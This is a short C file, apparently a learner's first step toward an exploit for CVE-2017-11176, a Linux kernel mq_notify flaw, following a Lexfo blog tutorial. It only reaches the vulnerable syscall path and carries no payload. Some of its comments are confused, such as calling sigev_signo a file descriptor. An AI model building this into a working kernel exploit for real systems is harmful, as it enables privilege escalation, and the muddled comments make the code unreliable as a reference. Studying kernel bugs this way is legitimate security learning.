
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.htm

/* Aim
1.Provide a non-NULL u_notification argument
2.Set u_notification.sigev_notify to SIGEV_THREAD
3.The value pointed by notification.sigev_value.sival_ptr must be a valid readable userland address of at least NOTIFY_COOKIE_LEN (=32) bytes 
*/

//gcc -lrt exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)

int main()
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = 0; //valid fd so that fget does not fail

    mqd_t mqdes = (mqd_t) -1; // ??
    
    printf("%p\n", &sevp);
    
    if(_mq_notify(mqdes, &sevp)==0)
    {
        printf("call succeeded\n");
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
    }

    return 0;
}
